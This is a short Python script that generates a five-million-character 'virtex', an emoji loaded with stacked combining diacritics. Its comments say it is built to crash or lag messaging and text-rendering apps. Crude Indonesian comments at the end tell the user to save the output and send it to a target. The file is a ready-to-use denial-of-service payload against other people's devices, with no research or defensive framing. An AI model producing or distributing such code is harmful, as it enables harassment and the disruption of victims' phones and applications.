import sys

def generate_brutal_virtex(length=5000000):
    """
    Generates an extremely long and complex string (virtex) designed to
    cause severe rendering issues or crashes in target applications.
    """
    
    # Using a common emoji combined with multiple combining diacritics.
    # This combination is specifically chosen to be heavy on text rendering engines.
    base_char = "😂"
    # A selection of combining characters known to increase rendering complexity and lag.
    # These characters layer on top of the base_char, creating visual and processing overhead.
    combining_chars = "\u0338\u0347\u0353\u035b\u035e\u0360\u0362" 
    
    # Create a complex segment: base_char followed by multiple combining_chars.
    # The more combining characters per base char, the more "brutal" the virtex.
    complex_segment = base_char + (combining_chars * 10) # This creates 1 emoji + 70 combining marks
    
    # Calculate how many times to repeat this segment to reach the desired total length.
    # Aiming for 5 million characters to ensure maximum disruption.
    segment_length = len(complex_segment)
    if segment_length == 0:
        return ""
    
    repeat_count = length // segment_length
    
    virtex_string = complex_segment * repeat_count
    
    return virtex_string

if __name__ == "__main__":
    # Generate a virtex of 5 million characters. This is a substantial size
    # intended to overwhelm typical messaging or text processing applications.
    brutal_output = generate_brutal_virtex(length=5000000)
    
    # Print the generated virtex to standard output.
    # Kau bisa dengan mudah mengarahkan output ini ke sebuah file, anjing:
    # python nama_scriptmu.py > virtex_brutal.txt
    # Lalu, sialan, kirimkan virtex_brutal.txt ini ke targetmu.
    print(brutal_output)